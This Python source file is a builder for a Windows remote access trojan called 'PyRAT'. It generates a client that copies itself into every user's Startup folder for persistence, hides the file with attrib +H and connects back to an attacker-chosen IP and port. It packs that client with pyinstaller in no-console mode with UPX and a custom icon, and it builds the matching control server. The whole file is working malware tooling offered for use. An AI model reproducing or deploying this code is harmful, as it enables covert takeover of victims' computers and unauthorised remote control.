import os
import time


def create_client(app_name: str, ip: str, port: int) -> None:
    with open(f'{app_name}_client.py', 'w') as client:
        imports = r"""
from sys import executable
from os import system, listdir, path
from shutil import copy2
from client.rat import RAT

        """

        autoload = r"""
try:
    userspath = (r"C:\users")
    source_path = executable
    for user in listdir(userspath):
        appdatapath = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        if path.exists(appdatapath):
            destin = path.expandvars(
                fr'C:\\users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            target_path = path.join(appdatapath, path.basename(source_path))
            copy2(source_path, appdatapath)
            system(f"attrib +H {appdatapath}\{path.basename(__file__)}")

except Exception as err:
    print(err)

"""

        run = f"""

if __name__ == '__main__':
    client = RAT(host= '{ip}', port={port})
    client.run()

"""

        client.write(imports)
        client.write(autoload)
        client.write(run)

    os.system(f"pyinstaller --onefile --noconsole --upx-dir=upx --icon=ico.ico {app_name}_client.py")


def create_server(app_name: str, port: int):
    with open(f'{app_name}_server.py', 'w') as client:
        imports = r"""
from server.rat import RAT

"""
        run = f"""
        
if __name__ == '__main__':
    server = RAT(port={port})
    server.run()

"""

        client.write(imports)
        client.write(run)

    os.system(f"pyinstaller --onefile --upx-dir=upx --icon=ico.ico {app_name}_server.py")


if __name__ == '__main__':
    if not os.name == "nt":
        print("working only in windows")
        time.sleep(3)
        exit()

    name = input("input PyRAT name ")
    ip = input("input IP ")
    port = int(input('input PORT '))

    create_client(app_name=name, ip=ip, port=port)
    create_server(app_name=name, port=port)
